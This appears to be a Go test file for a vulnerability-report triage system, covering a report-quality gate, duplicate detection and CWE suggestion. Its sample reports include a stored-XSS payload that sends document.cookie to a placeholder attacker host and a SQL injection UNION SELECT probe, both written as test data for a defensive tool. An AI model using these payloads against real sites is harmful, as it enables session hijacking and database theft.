package handlers

import "testing"

func TestEvaluateEvidenceStrongReportPassesGate(t *testing.T) {
	q := evaluateEvidence(reportEvidence{
		Title:            "Stored XSS in profile comment renderer",
		Description:      "A stored XSS occurs when posting HTML payloads in profile comments. The payload executes for any authenticated user viewing the profile page.",
		StepsToReproduce: "1. Login as user A. 2. Post payload in comment box. 3. View profile as user B. 4. Observe script execution and cookie exfiltration.",
		Impact:           "Attacker can hijack active sessions and perform privileged actions on behalf of victims, including account takeover for admins.",
		POC:              "<script>fetch('https://attacker.tld?c='+document.cookie)</script>",
		Vulnerability:    "xss",
		AttackVector:     "web",
		CWE:              "CWE-79",
		ReferenceLinks:   "https://owasp.org/www-community/attacks/xss/",
	})

	if !q.passesGate() {
		t.Fatalf("expected quality gate to pass, got score=%d grade=%s flags=%v", q.Score, q.Grade, q.Flags)
	}
	if q.Score < 70 {
		t.Fatalf("expected high quality score, got %d", q.Score)
	}
}

func TestEvaluateEvidenceWeakReportFailsGate(t *testing.T) {
	q := evaluateEvidence(reportEvidence{
		Title:            "bug",
		Description:      "broken",
		StepsToReproduce: "open app",
		Impact:           "bad",
		Vulnerability:    "xss",
	})
	if q.passesGate() {
		t.Fatalf("expected quality gate failure, got score=%d grade=%s flags=%v", q.Score, q.Grade, q.Flags)
	}
}

func TestBuildAutomatedTriageDetectsDuplicateAndSeverity(t *testing.T) {
	source := triageSourceReport{
		ID:                "00000000-0000-0000-0000-000000000010",
		OrgID:             "00000000-0000-0000-0000-000000000001",
		Title:             "SQL injection in search endpoint",
		AffectedAsset:     "api.example.local",
		VulnerabilityType: "sqli",
		Description:       "The q parameter in /search is concatenated into SQL without parameterization.",
		StepsToReproduce:  "Send q=' UNION SELECT version()-- and observe SQL error behavior and data leakage.",
		Impact:            "Attacker can extract database records and potentially escalate to RCE depending on DB extensions.",
		Severity:          "high",
		AttackVector:      "network",
	}
	candidates := []triageCandidate{
		{
			ID:                "00000000-0000-0000-0000-000000000999",
			Title:             "SQL injection in search endpoint",
			AffectedAsset:     "api.example.local",
			VulnerabilityType: "sql injection",
			Description:       "Unparameterized SQL in search query causes injection.",
			StepsToReproduce:  "Use UNION SELECT payload in search query parameter.",
			Impact:            "Read arbitrary data from database.",
			Severity:          "high",
			Status:            "resolved",
		},
	}
	result := buildAutomatedTriage(source, candidates)
	if result.DuplicateOf == "" {
		t.Fatalf("expected duplicate recommendation, got empty duplicate id")
	}
	if result.DuplicateConfidence < 0.78 {
		t.Fatalf("expected high duplicate confidence, got %.3f", result.DuplicateConfidence)
	}
	if result.SuggestedSeverity != "high" && result.SuggestedSeverity != "critical" {
		t.Fatalf("expected high/critical severity, got %s", result.SuggestedSeverity)
	}
	if result.SuggestedCWE == "" {
		t.Fatalf("expected suggested CWE for SQLi report")
	}
}

func TestRecommendCWEUsesProvidedCWE(t *testing.T) {
	source := triageSourceReport{
		Title: "test",
		CWE:   "CWE-89",
	}
	cwe, conf, _ := recommendCWE(source)
	if cwe != "CWE-89" {
		t.Fatalf("expected provided CWE to be preferred, got %s", cwe)
	}
	if conf < 0.95 {
		t.Fatalf("expected high confidence for provided CWE, got %.2f", conf)
	}
}
